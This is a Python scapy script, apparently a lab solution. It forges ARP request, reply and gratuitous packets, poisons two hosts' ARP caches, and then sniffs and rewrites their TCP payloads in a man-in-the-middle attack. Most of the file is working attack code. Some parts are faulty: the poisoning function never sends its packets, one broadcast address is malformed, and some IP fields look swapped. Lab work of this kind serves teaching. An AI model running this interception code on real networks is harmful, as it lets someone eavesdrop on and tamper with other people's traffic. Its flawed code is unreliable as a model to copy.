from scapy.all import *
import re


# Task 1A - Using ARP Requset

victim_dst = "ENTER victim's MAC address"
src_mac = "ENTER the MAC address of the machine that sends the ARP (the one you want to be shown)"

victim_ip = "Enter the victim's IP address"
src_ip = "ENTER the IP address of the machine that sends the ARP (the one you want to be shown)"


E = Ether(dst = victim_dst, src = src_mac)
A = ARP(hwsrc=src_mac, psrc=victim_ip,
         hwdst=victim_dst, pdst=src_ip, op=1)       # op=1 means that the ARP message is a ARP request (AKA "who-has").

pkt = E/A
pkt.show()
sendp(pkt)


# Task 1B - Using ARP Reply

victim_dst = "ENTER victim's MAC address"
src_mac = "ENTER the MAC address of the machine that sends the ARP (the one you want to be shown)"

victim_ip = "Enter the victim's IP address"
src_ip = "ENTER the IP address of the machine that sends the ARP (the one you want to be shown)"


E = Ether(dst = victim_dst, src = src_mac)
A = ARP(hwsrc=src_mac, psrc=victim_ip,
         hwdst=victim_dst, pdst=src_ip, op=2)       # op=2 means that the ARP message is a ARP reply (AKA "is-at").

pkt = E/A
pkt.show()
sendp(pkt)


# Task 1C - Using ARP Gratuitous message

src_mac = "ENTER the MAC address of the machine that sends the ARP (the one you want to be shown)"
src_ip = "ENTER the IP address of the machine that sends the ARP (the one you want to be shown)"


E = Ether(dst = 'ff:ff:ff:ff', src = src_mac)
A = ARP(hwsrc=src_mac, psrc=src_ip,
         hwdst='ff:ff:ff:ff', pdst=src_ip)       # Here we didn't use any op value, that means it's a gratuitous message 

pkt = E/A
pkt.show()
sendp(pkt)



# Task 2 - MITM attack

#  2.1 Poisoning the targets cache
def send_arp_packet(mac_dst, ip_dst, ip_src):
    mac_attacker = "ENTER the MAC address of the machine that sends the ARP (the one you want to be shown)"
    E = Ether(dst = mac_dst, src = mac_attacker)
    A = ARP(hwsrc=mac_attacker, psrc=ip_src,
         hwdst=mac_dst, pdst=ip_dst, op=2)       # op=2 means that the ARP message is a ARP reply (AKA "is-at").

mac_A = "Enter the MAC address of machine A"
mac_B = "Enter the MAC address of machine B"
ip_A = "Enter the IP address of machine A"
ip_B = "Enter the IP address of machine B"

send_arp_packet(mac_A, ip_A, ip_B)
send_arp_packet(mac_B, ip_B, ip_A)


# 2.2   Launching the MITM attack

def mitm_attack(pkt):
    if ((pkt[IP].src == ip_A) and (pkt[IP].dst == ip_B) and (pkt[TCP].payload)):
        old_data = pkt[TCP].payload.load
        data = old_data.decode()
        new_data = re.sub(r'[a-zA-Z]', r'z', data)
        print(f"Data was transformed from: {str(data)} to: {new_data}")

        new_pkt = pkt[IP]
        del(new_pkt.chksum)
        del(new_pkt[TCP].chksum)
        del(new_pkt[TCP].payload)

        send(new_pkt/new_data)


    elif ((pkt[IP].src ==ip_B) and (pkt[IP].dst == ip_A)):
        new_pkt = pkt[IP]
        send(new_pkt)

pkt = sniff(filter = """tcp and (ether src ENTER HERE THE MAC ADDRESS OF MACHINE A
                                 or ether src ENTER HERE THE MAC ADDRESS OF MACHINE B)""", prn = mitm_attack) 









